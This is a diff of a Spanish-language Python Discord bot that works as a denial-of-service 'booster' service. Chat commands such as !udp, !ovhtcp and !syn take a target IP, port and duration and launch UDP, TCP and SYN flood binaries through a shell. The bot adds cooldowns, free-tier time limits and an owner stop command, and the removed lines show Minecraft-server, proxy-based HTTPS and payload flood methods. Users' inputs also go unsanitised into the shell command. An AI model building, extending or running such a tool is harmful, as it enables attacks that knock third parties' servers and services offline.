@@ -4,23 +4,25 @@ from discord.ext import commands
 import asyncio
 import tempfile
 
+# Cargar el token desde la variable de entorno
 TOKEN = os.getenv('KEYS')
 
+# Imprimir información de configuración (con mejor formato)
 print("\n" + "="*60)
 print("🔍 CONFIGURANDO BOT")
 print("="*60)
 
 if TOKEN:
     token_length = len(TOKEN)
-    print(f"✅ Token obtenido de variable de entorno 'KEYS'")
+    print("✅ Token obtenido de variable de entorno 'KEYS'")
     print(f"📏 Longitud: {token_length} caracteres")
     print(f"🔐 Vista previa: {TOKEN[:15]}...")
 
     if token_length < 50:
-        print(f"⚠️  Advertencia: Token muy corto ({token_length} chars)")
+        print("⚠️  Advertencia: Token muy corto ({token_length} chars)")
         print("   Un token válido de Discord tiene ~59 caracteres")
 else:
-    print("❌ ERROR CRÍTICOOO: No se encontró el token")
+    print("❌ ERROR CRÍTICO: No se encontró el token")
     print("")
     print("SOLUCIÓN:")
     print("1. En GitHub Actions: Configura un secret llamado 'KEYS'")
@@ -34,155 +36,212 @@ else:
 
 print("="*60 + "\n")
 
+# Prefijo del bot y configuración de intents
 BOT_PREFIX = '!'
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents)
 
+# Lista de Owners (reemplaza con los IDs de tus usuarios)
+OWNER_IDS = [1422676828161703956]  # Ejemplo: [1234567890, 9876543210]
+
+# Diccionario para rastrear los cooldowns por usuario
+cooldowns = {}
+# Variable para controlar si un ataque está en curso
+ataque_en_curso = False
+
+# Variable para guardar el proceso del ataque en curso
+proceso_en_curso = None
+
+# Duración del cooldown (en segundos)
+COOLDOWN_DURATION = 40
+MAX_ATTACK_DURATION = 80
+
+# Evento que se activa cuando el bot está listo
 @bot.event
 async def on_ready():
     print(f'✅ Bot conectado como {bot.user.name} (ID: {bot.user.id})')
-    print(f'Attack MC Server 0.15, 1.1.5, 1.20')
-    await bot.change_presence(activity=discord.Game(name="Attack Minecraft Servers 0.15, 1.1.5, 1.20"))
+    print(f'Avalon Bot Free')
+    await bot.change_presence(activity=discord.Game(name="Avalon Revolution"))
 
+# Función para ejecutar un ataque (ahora con control de errores y mensajes)
 async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int):
+    global ataque_en_curso, proceso_en_curso
+
     try:
-        proceso = await asyncio.create_subprocess_shell(
+        # Marcar que un ataque está en curso
+        ataque_en_curso = True
+
+        proceso_en_curso = await asyncio.create_subprocess_shell(
             comando,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
-        stdout, stderr = await proceso.communicate()
+        await proceso_en_curso.wait()  # Esperar a que el proceso termine
 
-        try:
-            await ctx.send(f"Attack {ip}:{port} finished {tiempo}")
-        except:
-            pass
+        stdout, stderr = await proceso_en_curso.communicate()
 
-        print(f"Ataque '{comando}' terminado")
+        print(f"Attack method '{comando}' finished")
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"Error al ejecutar el ataque: {e}")
         try:
-            await ctx.send(f'Error: {e}')
+            await ctx.send(f'Error al ejecutar el ataque: {e}')
         except:
             pass
+    finally:
+        # Independientemente de si el ataque tuvo éxito o no,
+        # se levanta la bandera de ataque en curso.
+        ataque_en_curso = False
+        proceso_en_curso = None
 
-@bot.command(name='attack', help='!attack {method} {ip} {port} {time} [payload]')
-async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiempo: str = None, *, payload: str = None):
-    if metodo is None or ip is None or port is None or tiempo is None:
-        await ctx.send("!attack {method} {ip} {port} {time}")
-        return
+# Función para enviar mensajes con formato (embebs)
+async def enviar_mensaje_con_formato(ctx, title, description, color, footer_text=None):
+    embed = discord.Embed(title=title, description=description, color=color)
+    if footer_text:
+        embed.set_footer(text=footer_text)
+    await ctx.send(embed=embed)
 
-    if ip == "null" or port == "null" or tiempo == "null":
-        await ctx.send("Falta la IP, Puerto o Tiempo")
+# Comandos de ataque
+@bot.command(name='udp')
+async def udp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
+    await realizar_ataque(ctx, 'udp', ip, port, tiempo)
+
+@bot.command(name='hex')
+async def hex_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
+    await realizar_ataque(ctx, 'hex', ip, port, tiempo)
+
+@bot.command(name='udppps')
+async def udppps_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
+    await realizar_ataque(ctx, 'udppps', ip, port, tiempo)
+
+@bot.command(name='ovhudp')
+async def ovhudp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
+    await realizar_ataque(ctx, 'ovhudp', ip, port, tiempo)
+
+@bot.command(name='ovhtcp')
+async def ovhtcp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
+    await realizar_ataque(ctx, 'ovhtcp', ip, port, tiempo)
+
+@bot.command(name='syn')
+async def syn_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
+    await realizar_ataque(ctx, 'syn', ip, port, tiempo)
+
+async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
+    global ataque_en_curso, proceso_en_curso
+    user_id = ctx.author.id
+
+    # 1. Validaciones iniciales
+    if ip is None or port is None or tiempo is None:
+        await enviar_mensaje_con_formato(ctx, "Error", f"Faltan argumentos. Usa !{metodo} ip port time", discord.Color.red())
         return
 
     try:
         port_int = int(port)
         tiempo_int = int(tiempo)
-    except:
-        await ctx.send("Puerto y tiempo deben ser números")
+    except ValueError:
+        await enviar_mensaje_con_formato(ctx, "Error", "Puerto y tiempo deben ser números de almenos 2 digitos", discord.Color.red())
         return
 
     if port_int < 1 or port_int > 65535:
-        await ctx.send("Puerto no valido")
+        await enviar_mensaje_con_formato(ctx, "Error", "Puerto no válido", discord.Color.red())
         return
 
     if tiempo_int <= 0:
-        await ctx.send("El tiempo debe ser mayor a 0")
+        await enviar_mensaje_con_formato(ctx, "Error", "El tiempo tiene que ser mayor a 0", discord.Color.red())
         return
 
-    comando = None
+    if tiempo_int > MAX_ATTACK_DURATION:
+        await enviar_mensaje_con_formato(ctx, "Error", f"El tiempo máximo para usuarios free es de {MAX_ATTACK_DURATION} segundos", discord.Color.red())
+        return
 
+    # 2. Cooldown y ataque en curso
+    if user_id in cooldowns and cooldowns[user_id] > asyncio.get_event_loop().time():
+        tiempo_restante = cooldowns[user_id] - asyncio.get_event_loop().time()
+        await enviar_mensaje_con_formato(ctx, "Cooldown", f"Debes esperar {tiempo_restante:.2f} segundos para volver a atacar", discord.Color.orange())
+        return
+
+    if ataque_en_curso:
+        await enviar_mensaje_con_formato(ctx, "Error", "Ya hay un ataque en curso, espera a que termine", discord.Color.red())
+        return
+
+    # 3. Preparar y ejecutar el ataque
+    comando = None
     if metodo == 'udp':
         comando = f'./udp {ip} {port_int} -t 32 -s 64 -d {tiempo_int}'
-        await ctx.send(f'Successful Attack UDP TargetIP:`{ip}` TargetPort:`{port_int}` Time:`{tiempo_int}`')
-
-    elif metodo == 'udphex':
-        comando = f'./udphex {ip} {port_int} {tiempo_int}'
-        await ctx.send(f'Successful Attack UDPHEX TargetIP:`{ip}` TargetPort:`{port_int}` Time:`{tiempo_int}`')
-
+    elif metodo == 'hex':
+        comando = f'./hex {ip} {port_int} {tiempo_int}'
     elif metodo == 'udppps':
         comando = f'./udppps {ip} {port_int} {tiempo_int}'
-        await ctx.send(f'Successful Attack UDPpps TargetIP:`{ip}` TargetPort:`{port_int}` Time:`{tiempo_int}`')
-
-    elif metodo == 'udpflood':
-        comando = f'go run udpflood.go {ip} {port_int} {tiempo_int}'
-        await ctx.send(f'Successful Attack UDPFlood TargetIP:`{ip}` TargetPort:`{port_int}` Time:`{tiempo_int}`')
-
+    elif metodo == 'ovhudp':
+        comando = f'sudo ./ovhudp {ip} {port_int} 40 -1 {tiempo_int}'
     elif metodo == 'ovhtcp':
-        comando = f'sudo ./ovh {ip} {port_int} 20 -1 {tiempo_int}'
-        await ctx.send(f'Successful Attack OVHTCP TargetIP:`{ip}` TargetPort:`{port_int}` Time:`{tiempo_int}`')
-
-    elif metodo == 'udppayload':
-        if payload is None or payload == "null":
-            await ctx.send("Falta el payload")
-            return
-
-        if len(payload) > 1024:
-            await ctx.send("Payload maximo 250 bytes")
-            return
-
-        import tempfile
-        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
-            f.write(payload)
-            temp_file = f.name
-
-        comando = f'./udppayload {ip} {port_int} {tiempo_int} "{temp_file}"'
-        await ctx.send(f'Successful Attack UDPPayload TargetIP:`{ip}` TargetPort:`{port_int}` Time:`{tiempo_int}` PayloadBytes:`{len(payload)}`')
-
-    elif metodo == 'raknet':
-        comando = f'go run raknet.go {ip} {port_int} {tiempo_int}'
-        await ctx.send(f'Successful Attack RakNet TargetIP:`{ip}` TargetPort:`{port_int}` Time:`{tiempo_int}`')
-
-    elif metodo == 'udpbypass':
-        comando = f'./udpbypass {ip} {port_int} {tiempo_int}'
-        await ctx.send(f'Successful Attack UDPBypass TargetIP:`{ip}` TargetPort:`{port_int}` Time:`{tiempo_int}`')
-
-    elif metodo == 'tcp':
-        comando = f'./tcp {ip} {port_int} {tiempo_int}'
-        await ctx.send(f'Successful Attack TCP TargetIP:`{ip}` TargetPort:`{port_int}` Time:`{tiempo_int}`')
-
-    elif metodo == 'tcp-syn':
-        comando = f'./tcp-syn {ip} {port_int} {tiempo_int}'
-        await ctx.send(f'Successful Attack TCP-SYN TargetIP:`{ip}` TargetPort:`{port_int}` Time:`{tiempo_int}`')
-
-    elif metodo == 'https-request':
-        comando = f'node gravitus.js {ip} {tiempo_int} 30 10 proxy.txt'  # Adjust threads/rate as needed
-        await ctx.send(f'Successful Attack HTTPs-Request TargetIP:`{ip}` Time:`{tiempo_int}`') #Port Removed Because Is Not Needed
-
+        comando = f'sudo ./ovhtcp {ip} {port_int} 40 -1 {tiempo_int}'
+    elif metodo == 'syn':
+        comando = f'./tcp-syn {ip} {port_int} {tiempo_int}'  # Asumiendo que tcp-syn es el script para SYN
     else:
-        await ctx.send('Método no encontrado, usa !methods')
+        await enviar_mensaje_con_formato(ctx, "Error", "Método no válido. Usa !methods para ver la lista de métodos disponibles.", discord.Color.red())
         return
 
-    try:
-        if comando:
-            asyncio.create_task(ejecutar_ataque(comando, ctx, ip, port_int, tiempo_int))
-    except Exception as e:
-        await ctx.send(f'Error: {e}')
+    # Enviar mensaje de éxito con formato
+    embed = discord.Embed(
+        title="¡Ataque Iniciado!",
+        description=f"**TargetIP/Port:** {ip}:{port_int}\n**Método:** {metodo.upper()}\n**Tiempo:** {tiempo_int}",
+        color=discord.Color.green()
+    )
+    embed.set_footer(text=f"Ataque enviado por {ctx.author.name}#{ctx.author.discriminator}", icon_url=ctx.author.avatar.url)
+    await ctx.send(embed=embed)
 
+    # Establecer cooldown y ejecutar ataque
+    cooldowns[user_id] = asyncio.get_event_loop().time() + tiempo_int + COOLDOWN_DURATION
+    await ejecutar_ataque(comando, ctx, ip, port_int, tiempo_int)
+
+# Comando para mostrar los métodos disponibles
 @bot.command(name='methods')
 async def show_methods(ctx):
-    methods_info = """
-Methods L4 UDP Protocol:
-`• udp`
-`• udphex`
-`• udppps (Method Inactive)`
-`• udpflood`
-`• udppayload`
-`• udpbypass`
-`• raknet`
+    embed = discord.Embed(
+        title="Metodos Disponibles",
+        description="Se añadiran mas metodos en el futuro:",
+        color=discord.Color.blue()
+    )
 
-Methods L4 TCP Protocol:
-`• tcp`
-`• tcp-syn (Multi-threaded)`
-`• ovhtcp`
+    embed.add_field(name="L4 UDP Protocol", value="`• udp`\n`• hex`\n`• udppps`\n`• ovhudp'", inline=False)
+    embed.add_field(name="L4 TCP Protocol", value="`• ovhtcp`\n`• syn`", inline=False)
 
-Methods L7:
-`• https-request (proxy)`
-"""
-    await ctx.send(methods_info)
+    embed.set_footer(text=f"Solicitado por {ctx.author.name}#{ctx.author.discriminator}", icon_url=ctx.author.avatar.url)
+    await ctx.send(embed=embed)
 
+# Comando para detener todos los ataques (solo para owners)
+@bot.command(name='stopall')
+async def stopall_command(ctx):
+    global ataque_en_curso, proceso_en_curso
+
+    if ctx.author.id not in OWNER_IDS:
+        await enviar_mensaje_con_formato(ctx, "Error", "No puedes ejecutar este comando", discord.Color.red())
+        return
+
+    if proceso_en_curso:
+        try:
+            proceso_en_curso.terminate()  # Envía SIGTERM (intento de terminación suave)
+            await proceso_en_curso.wait()   # Espera a que el proceso termine
+            print("Attack Finish")
+        except ProcessLookupError:
+            print("El ataque ya se detuvo")
+        except Exception as e:
+            print(f"Error al terminar al detener: {e}")
+            await enviar_mensaje_con_formato(ctx, "Error", f"Error al detener el ataque: {e}", discord.Color.red())
+
+        proceso_en_curso = None
+        ataque_en_curso = False
+    else:
+        await enviar_mensaje_con_formato(ctx, "Información", "Ya no hay ataques en curso", discord.Color.yellow())
+
+    #Por ahora, solo reseteamos el cooldown para permitir nuevos ataques
+    cooldowns.clear()
+    ataque_en_curso = False
+
+    await enviar_mensaje_con_formato(ctx, "Ataques detenidos con exito", discord.Color.green())
+
+# Iniciar el bot
 print("🚀 INICIANDO BOT CON TODOS LOS MÉTODOS")
 print("🔧 Configurado para leer directamente de secret 'KEYS'")
 print(f"📏 Token verificado: {len(TOKEN)} caracteres")
@@ -190,7 +249,7 @@ print(f"📏 Token verificado: {len(TOKEN)} caracteres")
 try:
     bot.run(TOKEN)
 except discord.LoginFailure:
-    print("\n❌ ERRORRRRR DE AUTENTICACIÓN")
+    print("\n❌ ERROR DE AUTENTICACIÓN")
     print("El token es inválido o ha expirado")
     print("Verifica que el secret 'KEYS' en GitHub tenga el token correcto")
     print("Obten un nuevo token en: https://discord.com/developers/applications")
